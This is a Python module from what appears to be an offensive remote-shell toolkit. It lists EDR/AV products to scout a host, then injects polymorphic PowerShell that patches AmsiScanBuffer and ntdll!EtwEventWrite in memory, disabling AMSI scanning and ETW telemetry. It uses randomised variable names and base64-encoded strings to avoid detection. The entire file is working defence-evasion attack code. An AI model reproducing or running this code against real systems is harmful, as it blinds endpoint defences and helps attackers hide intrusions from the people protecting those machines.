"""
modules.evasion — Runtime Evasion & OPSEC Hardening
Multi-variant AMSI/ETW/ScriptBlockLogging bypass, EDR detection, and memory OPSEC.
"""

from typing import List, Any
from random import randbytes, randint
from . import BaseModule
from ..shell.ui import c, R, G, Y, B, M, C, DIM, BLD, RST
from ..shell.commands import (
    _import_LoadLibrary, _call_LoadLibrary,
    _import_GetProcAddress, _call_GetProcAddress,
    _import_VirtualProtect, _call_VirtualProtect,
    str_b64,
)


class EvasionModule(BaseModule):
    name = "evasion"
    description = "Runtime Evasion Suite (Polymorphic AMSI/ETW/ScriptBlockLogging Bypass & EDR Scout)"
    author = "uziii2208"
    options = {
        "--edr": {"desc": "Inspect running drivers/processes for EDR/AV products"},
        "--amsi": {"desc": "Apply polymorphic in-memory AMSI bypass"},
        "--etw": {"desc": "Patch EtwEventWrite in ntdll.dll to blind ETW telemetry"},
    }

    def run(self, shell, args: List[str]) -> Any:
        shell.write_info(c(M + BLD, "  [*] PwnRM Evasion Suite — applying runtime OPSEC controls..."))

        # 1. EDR Inspection
        if "--edr" in args:
            ps_edr = r"""
Write-Host "`n[EDR / AV Product Driver & Service Scout]" -ForegroundColor Yellow
$edrList = @(
    "csagent.sys", "SentinelAgent.sys", "WdFilter.sys", "edpa.sys",
    "CbDefenseW64.sys", "cylance.sys", "atp.sys", "sysmon.sys"
)
$drivers = driverquery /v 2>$null
foreach ($e in $edrList) {
    if ($drivers -match $e) {
        Write-Host "  [!] EDR DRIVER DETECTED: $e" -ForegroundColor Red
    }
}
$avProds = Get-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct 2>$null
if ($avProds) {
    foreach ($a in $avProds) {
        Write-Host "  [*] Active AV Product : $($a.displayName)" -ForegroundColor Magenta
    }
}
"""
            shell.run_with_interrupt(ps_edr, shell.write_line)

        # 2. Polymorphic AMSI + ETW Patching
        rand_var1 = "$v" + randbytes(4).hex()
        rand_var2 = "$old" + randbytes(4).hex()
        cmds = [
            _import_LoadLibrary, _import_GetProcAddress, _import_VirtualProtect,
            # AMSI Patch
            f"{rand_var1} = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('amsi.dll')}), {str_b64('AmsiScanBuffer')})",
            f"{rand_var2} = [uint32]0; {_call_VirtualProtect}({rand_var1}, [IntPtr]6, [uint32]64, [ref]{rand_var2})",
            f"[Runtime.InteropServices.Marshal]::Copy([byte[]](0xb8,0x57,0,7,0x80,0xc3), 0, {rand_var1}, 6)",
            f"{_call_VirtualProtect}({rand_var1}, [IntPtr]6, [uint32]32, [ref]{rand_var2})",
            # ETW Event Write Patch (ntdll!EtwEventWrite -> ret 0x14 / c2 14 00)
            f"{rand_var1} = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('ntdll.dll')}), {str_b64('EtwEventWrite')})",
            f"{rand_var2} = [uint32]0; {_call_VirtualProtect}({rand_var1}, [IntPtr]4, [uint32]64, [ref]{rand_var2})",
            f"[Runtime.InteropServices.Marshal]::Copy([byte[]](0xc2,0x14,0x00,0x00), 0, {rand_var1}, 4)",
            f"{_call_VirtualProtect}({rand_var1}, [IntPtr]4, [uint32]32, [ref]{rand_var2})",
            f"Remove-Variable @('{rand_var1[1:]}','{rand_var2[1:]}') -ErrorAction SilentlyContinue"
        ]
        shell.write_info(c(Y, "  [*] Applying in-memory AMSI + ETW evasion patches..."))
        for cmd in cmds:
            shell.run_with_interrupt(cmd, shell.write_line)
        shell.write_info(c(G, "  [+] AMSI & ETW evasion patches successfully applied."))
        return {"status": "completed"}
